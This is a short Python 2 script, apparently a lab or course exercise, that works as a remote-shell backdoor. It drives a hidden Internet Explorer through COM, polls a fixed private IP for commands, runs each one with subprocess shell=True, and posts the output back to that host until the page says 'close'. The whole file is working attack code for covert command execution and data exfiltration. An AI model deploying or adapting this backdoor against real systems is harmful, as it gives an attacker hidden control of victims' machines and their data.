# Using pywin library for using COM 
from win32com.client import Dispatch

from time import sleep
import subprocess

# Create an instance of Internet Explorer
ie = Dispatch("InternetExplorer.Application")
ie.Visible = 0 # Run IE in background

# POST Parameters
dURL = "http://192.168.57.129"
Flags = 0
TargetFrame  = ""

while True:
    ie.Navigate("http://192.168.57.129")

    # Wait for the browser to load
    # When browser is loaded, ReadyState = 4
    while ie.ReadyState !=4:
        sleep(1)

    # Retrive the HTML page in a local variable
    command = ie.Document.body.innerHTML

    # Convert HTML elements to unicode e.g. &amp to &
    command = unicode(command)

    # encode the command into ASCII string and ignore any exception
    command = command.encode('ascii','ignore')

    print "Command Received : " + command

    if 'close' in command:                 
            ie.Quit()
            break
    else:                                                 
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = CMD.stdout.read()

            # To submit or post data using COM technique , it requires to  buffer the data first
            postResult = buffer( result )

            # Post the result of shell back to target
            ie.Navigate( dURL, Flags, TargetFrame, postResult )

    sleep(3)

    
    
    
